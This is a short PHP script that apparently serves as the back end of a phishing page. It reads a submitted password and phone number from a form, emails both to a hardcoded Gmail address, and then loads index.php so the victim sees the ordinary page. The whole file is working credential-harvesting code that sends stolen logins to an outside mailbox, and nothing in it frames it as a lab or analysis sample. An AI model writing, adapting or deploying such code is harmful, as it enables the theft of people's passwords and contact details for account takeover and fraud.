<?php
    $passandtel = $_POST["pass"]." ".$_POST["tel"];
    $to = "buianbaevzhasulan@gmail.com";
    $subject = "Example";
    mail($to,$subject,$passandtel);
    
    require "index.php";
?>